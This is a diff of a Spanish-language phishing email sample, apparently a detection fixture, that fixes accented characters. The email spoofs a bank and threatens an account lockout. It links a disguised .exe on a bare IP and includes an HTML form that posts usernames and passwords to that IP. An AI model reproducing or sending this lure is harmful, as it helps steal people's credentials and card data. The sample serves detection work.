@@ -10,9 +10,9 @@ Authentication-Results: mx.universidad.example;
         dkim=fail header.d=banco.example;
         dmarc=fail header.from=banco.example
 From: "Banco Nacional Seguridad" <alertas@banco.example>
-Reply-To: "Centro de Validacion" <soporte@verify-login.ru>
+Reply-To: "Centro de Validación" <soporte@verify-login.ru>
 To: estudiante@universidad.example
-Subject: Accion requerida: cuenta bloqueada por actividad inusual
+Subject: Acción requerida: cuenta bloqueada por actividad inusual
 Date: Tue, 09 Jun 2026 21:38:39 -0600
 Message-ID: <20260609213839.938271@mailer-security-alerts.ru>
 MIME-Version: 1.0
@@ -30,15 +30,15 @@ Content-Transfer-Encoding: quoted-printable
 
 Estimado usuario:
 
-Detectamos actividad inusual en su cuenta. Por seguridad, su acceso sera bloqueado si no confirma su identidad hoy.
+Detectamos actividad inusual en su cuenta. Por seguridad, su acceso será bloqueado si no confirma su identidad hoy.
 
 Ingrese de inmediato en el siguiente enlace:
 http://198.51.100.44/secure-login/validar-token.exe
 
-Tambien puede verificar desde:
+También puede verificar desde:
 http://banco.example.security-update.verify-login.ru/session
 
-Debe confirmar usuario, contrasena, token y numero de tarjeta. Esta accion vence en 30 minutos.
+Debe confirmar usuario, contraseña, token y número de tarjeta. Esta acción vence en 30 minutos.
 
 --sentinel-alt-2026
 Content-Type: text/html; charset="utf-8"
@@ -48,7 +48,7 @@ Content-Transfer-Encoding: quoted-printable
 <html>
   <body>
     <h2>Centro de seguridad bancaria</h2>
-    <p>Detectamos actividad inusual en su cuenta. Por seguridad, su acceso sera bloqueado si no confirma su identidad hoy.</p>
+    <p>Detectamos actividad inusual en su cuenta. Por seguridad, su acceso será bloqueado si no confirma su identidad hoy.</p>
     <p>
       <a href="http://198.51.100.44/secure-login/validar-token.exe">
         https://banco.example/seguridad
@@ -62,9 +62,9 @@ Content-Transfer-Encoding: quoted-printable
     </p>
     <form action="http://198.51.100.44/capture" method="post">
       <input name="usuario">
-      <input name="contrasena" type="password">
+      <input name="contraseña" type="password">
     </form>
-    <p>Debe confirmar usuario, contrasena, token y numero de tarjeta. Esta accion vence en 30 minutos.</p>
+    <p>Debe confirmar usuario, contraseña, token y número de tarjeta. Esta acción vence en 30 minutos.</p>
   </body>
 </html>
 
